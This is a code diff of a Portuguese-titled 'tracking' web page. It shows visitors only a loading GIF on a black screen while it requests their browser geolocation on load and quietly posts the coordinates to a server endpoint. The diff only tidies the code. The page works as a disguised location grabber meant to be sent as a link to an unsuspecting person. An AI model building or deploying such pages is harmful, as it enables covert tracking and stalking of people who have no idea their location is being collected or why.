@@ -5,80 +5,34 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Rastreamento</title>
     <style>
-        
-        body, html {
-            height: 100%;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: black;
-        }
-        #loadingGif {
-            width: 300px; /* tamanho do gif */
-            height: auto;
-        }
+        body, html { height: 100%; margin: 0; display: flex; justify-content: center; align-items: center; background: black; }
+        #loadingGif { width: 300px; height: auto; }
     </style>
 </head>
 <body>
-    
     <img id="loadingGif" src="/static/loading.gif" alt="Loading..." />
     
     <script>
-        
         function getLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+                navigator.geolocation.getCurrentPosition(sendLocation, console.error);
             } else {
-                console.error("Geolocalização não suportada pelo navegador.");
+                console.error("Geolocalização não suportada.");
             }
         }
 
         function sendLocation(position) {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-
-            const data = {
-                latitude: latitude,
-                longitude: longitude
-            };
-
-            fetch("/salvar_localizacao", {
+            fetch("/save", {
                 method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(data)
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ latitude: position.coords.latitude, longitude: position.coords.longitude })
             })
-            .then(response => response.json())
-            .then(data => {
-                console.log("Localização salva com sucesso!", data);
-            })
-            .catch(error => {
-                console.error("Erro ao enviar a localização", error);
-            });
+            .then(res => res.json())
+            .then(console.log)
+            .catch(console.error);
         }
 
-        function showError(error) {
-            switch (error.code) {
-                case error.PERMISSION_DENIED:
-                    console.error("Usuário negou a permissão de geolocalização.");
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    console.error("A posição geográfica não está disponível.");
-                    break;
-                case error.TIMEOUT:
-                    console.error("A solicitação de geolocalização expirou.");
-                    break;
-                default:
-                    console.error("Erro desconhecido.");
-                    break;
-            }
-        }
-
-        window.onload = function() {
-            getLocation();
-        }
+        window.onload = getLocation;
     </script>
 </body>
 </html>
